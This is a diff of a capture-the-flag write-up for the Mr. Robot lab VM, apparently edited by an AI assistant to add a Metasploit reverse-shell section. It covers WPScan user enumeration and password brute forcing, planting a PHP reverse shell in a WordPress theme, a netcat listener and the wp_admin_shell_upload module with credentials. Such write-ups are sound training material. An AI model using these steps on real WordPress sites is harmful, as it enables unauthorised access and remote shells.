@@ -1,3 +1,5 @@
+Here’s the updated version of the report with steps for using `msfconsole` to gain a reverse shell:
+
 ---
 
 # Exploitation Walkthrough: Mr. Robot VM
@@ -13,6 +15,8 @@ This report details the exploitation process for the **Mr. Robot CTF** virtual m
 - [Step 2: Initial Scanning](#step-2-initial-scanning)
 - [Step 3: WordPress Enumeration](#step-3-wordpress-enumeration)
 - [Step 4: Exploiting WordPress](#step-4-exploiting-wordpress)
+  - [Manual Reverse Shell](#manual-reverse-shell)
+  - [Reverse Shell via Metasploit](#reverse-shell-via-metasploit)
 - [Step 5: Privilege Escalation](#step-5-privilege-escalation)
 - [Step 6: Final Steps to Root](#step-6-final-steps-to-root)
 - [Conclusion](#conclusion)
@@ -33,27 +37,27 @@ This report details the exploitation process for the **Mr. Robot CTF** virtual m
 ### Retrieving the MAC Address
 The MAC address was retrieved from the VM's Bridge Adapter settings in Advanced Mode:
 ```
-08:00:27:D9:5E:C7
+XX:XX:XX:XX:XX:XX
 ```
 
 ### Finding the Target's IP Address
 Using `arp -a`, we matched the MAC address to its corresponding IP address on the network. Additionally, we performed a subnet scan using Nmap:
 ```bash
-nmap -sn 192.168.0.0/24
+nmap -sn X.X.X.0/24
 ```
 Result:
 ```
-192.168.0.1
-192.168.0.112
-192.168.0.163
-192.168.0.231
+X.X.X.1
+X.X.X.112
+X.X.X.163
+X.X.X.number
 ```
-The target was identified at `192.168.0.231`.  
+The target was identified at `X.X.X.number`.  
 
 ### Setting the IP as a Variable
 To simplify future commands:
 ```bash
-export ip=192.168.0.231
+export ip=X.X.X.number
 ```
 
 ---
@@ -105,12 +109,12 @@ Using WPScan:
 wpscan --url http://$ip --enumerate u
 ```
 Findings:
-- **Username:** `admin`
+- **Username:** `Elliot`
 
 ### Brute-Forcing the Password
 Using the processed wordlist:
 ```bash
-wpscan --url http://$ip --usernames admin --passwords fsocity_unique.dic
+wpscan --url http://$ip --usernames Elliot --passwords fsocity_unique.dic
 ```
 Credentials found:
 - **Username:** Elliot  
@@ -120,15 +124,46 @@ Credentials found:
 
 ## Step 4: Exploiting WordPress
 
-### Gaining a Reverse Shell
+### Manual Reverse Shell
 - Edited the WordPress theme file (`archive.php`) to include a PHP reverse shell script.
+[PentestMonkeyReverseShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 - Started a listener on the attacker machine:
   ```bash
   nc -lvnp 4444
   ```
 - Successfully gained access to the target shell.
 
+### Reverse Shell via Metasploit
+Alternatively, Metasploit's WordPress exploit can be used to gain a reverse shell:
+1. Start `msfconsole`:
+   ```bash
+   msfconsole
+   ```
+
+2. Use the `wp_admin_shell_upload` module:
+   ```bash
+   use exploit/unix/webapp/wp_admin_shell_upload
+   ```
+
+3. Set the required options:
+   ```bash
+   set RHOSTS X.X.X.number
+   set TARGETURI /wordpress
+   set USERNAME Elliot
+   set PASSWORD ER28-0652
+   set LHOST X.X.X.your_ip
+   set LPORT 4444
+   ```
+
+4. Exploit the target:
+   ```bash
+   exploit
+   ```
+
+5. Upon successful exploitation, a reverse shell is opened.
+
 ### Stabilizing the Shell
+Regardless of the method used, stabilize the shell:
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -188,7 +223,7 @@ Content:
 
 ## Conclusion
 
-With the discovery of the final key, the **Mr. Robot VM** was fully exploited. This exercise demonstrated the use of enumeration, brute-forcing, privilege escalation, and lateral movement techniques. The process highlighted the importance of securing WordPress installations and mitigating common misconfigurations.
+With the discovery of the final key, the **Mr. Robot VM** was fully exploited. This exercise demonstrated the use of enumeration, brute-forcing, privilege escalation, and lateral movement techniques. It also highlighted the flexibility of tools like `msfconsole` and manual approaches for exploitation. The process underscored the importance of securing WordPress installations and mitigating common misconfigurations.
 
 ---
 
@@ -201,4 +236,6 @@ With the discovery of the final key, the **Mr. Robot VM** was fully exploited. T
 
 This concludes the journey of owning the **Mr. Robot VM** and gaining valuable insights into system exploitation.
 
---- 
+---
+
+You can now paste this text into a `README.md` file for GitHub. Let me know if you need any further changes!
